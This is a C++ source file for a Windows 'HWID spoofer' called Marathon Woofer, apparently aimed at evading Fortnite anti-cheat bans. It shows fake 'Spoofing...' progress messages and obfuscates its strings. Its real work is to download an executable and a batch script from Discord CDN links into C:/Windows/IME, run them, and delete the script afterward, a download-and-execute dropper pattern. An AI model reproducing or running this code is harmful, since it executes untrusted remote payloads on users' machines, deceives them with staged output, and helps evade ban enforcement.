//Dev By SynixDev#1010 github.com/SynixDev

#include <iostream>
#include <Windows.h>
#include <ios>
#include <limits>
#include <stdio.h>
#include <time.h>
#include <conio.h>
#include <sstream>
#include <string>
#include <urlmon.h>
#include <tchar.h>
#include "xor.hpp"
#pragma comment (lib, "urlmon.lib")


//Dev By SynixDev#1010 github.com/SynixDev

std::string RandomString(const size_t length)
{
    std::string r;
    static const char bet[] = { "ABCDEFGHIJKLMNOPQRSTUVWXYabcdefghijklmnopqrstuvwxyzZ1234567890" };
    srand((unsigned)time(NULL) * 5);
    for (int i = 0; i < length; ++i)
        r += bet[rand() % (sizeof(bet) - 1)];
    return r;
}

void Woof()
{

    system("cls");

    SetConsoleTitleA(RandomString(16).c_str());

    system("color B");

    std::cout << _xor_("\n\n      Spoofing You Computer...") << "\n";

    SetConsoleTitleA(RandomString(16).c_str());

    Sleep(3500);

    system("cls");

    std::cout << _xor_("\n\n    Spoofing You Baseboard SerialNumber...") << "\n";

    Sleep(1500);

    system("cls");

    SetConsoleTitleA(RandomString(16).c_str());

    std::cout << _xor_("\n\n    Spoofing You Bios SerialNumber...") << "\n";

    Sleep(1500);

    system("cls");


    std::cout << _xor_("\n\n    Spoofing You Cpu SerialNumber...") << "\n";

    Sleep(1500);

    system("cls");

    SetConsoleTitleA(RandomString(16).c_str());


    std::cout << _xor_("\n\n    Spoofing You Bios Uuid...") << "\n";

    Sleep(1500);

    system("cls");


    std::cout << _xor_("\n\n    Spoofing You Diskdrive SerialNumber...") << "\n";
    system("cls");

    std::cout << _xor_("\n\n    Old Hwid :\n\n") << "\n";

    system("    wmic diskdrive get serialnumber");

    Sleep(7500);

    system("cls");


    SetConsoleTitleA(RandomString(16).c_str());

    SetConsoleTitleA(RandomString(16).c_str());

    // Source : github.com/btbd/hwid

    HRESULT a = URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/839229954793406535/841390124680085514/Serial.exe"), _T("C:/Windows/IME/Serial.exe"), 0, NULL);

    // Source : github.com/btbd/hwid

    system("start C://Windows//IME//Serial.exe");

    SetConsoleTitleA(RandomString(16).c_str());

    SetConsoleTitleA(RandomString(16).c_str());

    Sleep(7500);

    std::cout << _xor_("\n\n    New Hwid :\n\n") << "\n";

    system("    wmic diskdrive get serialnumber");

    Sleep(3500);


    system("cls");


    std::cout << _xor_("\n\n    Spoofing You Baseboard Uuid...") << "\n";

    Sleep(1500);

    system("cls");


    std::cout << _xor_("\n\n    Spoofing You Ram SerialNumber...") << "\n";

    Sleep(1500);

    system("cls");


    std::cout << _xor_("\n\n    Spoofing You Cpu ProcessorId...") << "\n";

    Sleep(1500);

    system("cls");

    std::cout << _xor_("\n\n    You Pc Is Spoofing By Marathon Woofer...") << "\n";

    Sleep(7500);
}



void Trace()
{

    system("cls");

    SetConsoleTitleA(RandomString(16).c_str());

    system("color B");


    std::cout << _xor_("\n\n      Cleaning You Tracking File...") << "\n";

    HRESULT a = URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/888490416247275522/888490726684491796/MarathonTracers.bat"), _T("C:/Windows/IME/MarathonTracers.bat"), 0, NULL);
    system("start C:/Windows/IME/MarathonTracers.bat");

    Sleep(1500);

    system("taskkill /f /im cmd.exe >nul 2>&1");

    remove("C://Windows//IME//MarathonTracers.bat");


    Woof();
}


int main()
{
    system("taskkill /f /im EpicGamesLauncher.exe >nul 2>&1");
    system("taskkill /f /im FortniteClient-Win64-Shipping.exe >nul 2>&1");

	system("color B");

    SetConsoleTitleA(RandomString(16).c_str());

    std::cout << _xor_("\n\n      Welcome To Marathon Woofer") << "\n";

    system("start https://github.com/SynixDev");

    Sleep(3000);

	std::cout << _xor_("\n\n      Connecting...") << "\n";

    Sleep(4500);
 
	std::cout << _xor_("\n\n      Status: Undetected") << "\n";

    Sleep(2500);

    std::cout << _xor_("\n\n      Version: 1.0") << "\n";

    Sleep(2000);

    Trace();
}





//Dev By SynixDev#1010 github.com/SynixDev